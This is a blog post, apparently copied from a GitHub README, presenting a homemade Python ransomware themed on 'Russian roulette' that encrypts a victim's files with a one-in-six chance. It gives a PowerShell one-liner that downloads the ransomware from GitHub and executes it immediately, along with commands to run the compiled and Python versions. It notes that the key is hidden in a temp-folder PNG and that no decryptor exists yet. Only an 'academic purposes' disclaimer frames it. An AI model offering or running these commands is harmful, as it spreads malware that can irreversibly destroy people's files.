---
layout: post
header-style: text
title: Kokomi Russian Roulette.
img: img/projects/krr/krr-header.webp
---

<!-- HTML Meta Tags -->
<meta property="og:title" content="KOKOMI RUSSIAN ROULETTE">
<meta name="description" content="Implementacion de un ransomware inspirado en Kokomi">
<meta property="og:site_name" content="QuantumWavves">

<!-- Facebook Meta Tags -->
<meta property="og:url" content="https://quantumwavves.github.io/projects/kokomi-russian-roulette/">
<meta property="og:type" content="website">
<meta property="og:title" content="KOKOMI RUSSIAN ROULETTE">
<meta property="og:description" content="Implementacion de un ransomware inspirado en Kokomi">
<meta property="og:image" content="https://quantumwavves.github.io/img/projects/krr/krr-header.webp">

<!-- Twitter Meta Tags -->
<meta name="twitter:card" content="summary_large_image">
<meta property="twitter:domain" content="quantumwavves.github.io">
<meta property="twitter:url" content="https://quantumwavves.github.io/projects/kokomi-russian-roulette/">
<meta name="twitter:title" content="KOKOMI RUSSIAN ROULETTE">
<meta name="twitter:description" content="Implementacion de un ransomware inspirado en Kokomi">
<meta name="twitter:image" content="https://quantumwavves.github.io/img/projects/krr/krr-header.webp">


<p align="center">
<img src="/img/projects/krr/kokomi-endgame.webp" alt="drawing" width="500"/><br>
</p>

`This is almost a copy of the README from the repository on github`{:.success}

### What is?
<p style="text-align:justify">It is a simple ransomware written in Python with the cryptography library inspired by the Kokomi-themed Russian roulette game.  6 cabins, one chance to be encrypted</p>

Github repo here: [Kokomi Russian Roulette](https://github.com/quantumwavves/Kokomi-Russian-Roulette)

### Warning
`This software was created for academic and learning purposes only. I am not responsible for any misuse that may occur.`{:.warning}

### Use

One line in powershell (without shortener, since the misuse of these is prohibited by the terms and services of the same.)
```console
irm https://raw.githubusercontent.com/quantumwavves/Kokomi-Russian-Roulette/master/bin/oneline/krr-oneline.ps1 | iex
```
Normal usage (powershell or cmd, not have GUI)
```console
$ kokomi-russian-roulette.exe
```
Dev `(I recommend using a python virtual environment)`{:.info}
```console
$ .\env\Scripts\activate
$ pip install -r requirements.txt
$ python krr-fernet.py
# Alternative version with pyAes, more slow, but more secure
$ python krr-aes.py
```
### Decrypt files (key)
K.R.R generates a unique, randomized carry for each execution of the kokomi() function. It is stored in a .png file in the following path $env:temp or also known as %temp% with the name `sngmy.png`{:.warning}, decryption program to be created soon.

### To do list
- [ ] Port another language more speed, like C++ or C.
- [ ] Create README with instructions for decryption.
- [ ] Create decryption function
- [ ] Optimize execution times
### Demo

This is a demo, using the one line version of powershell

<p style="text-align: center">
<video width="600" height="400" controls>
  <source src="/img/projects/krr/krr-demo.mp4" type="video/mp4">
</video>
</p>

### Inspiration
- [NaGa](https://github.com/ic4rta/NaGa)
- [Sangonomiya Kokomi](https://genshin-impact.fandom.com/wiki/Sangonomiya_Kokomi)
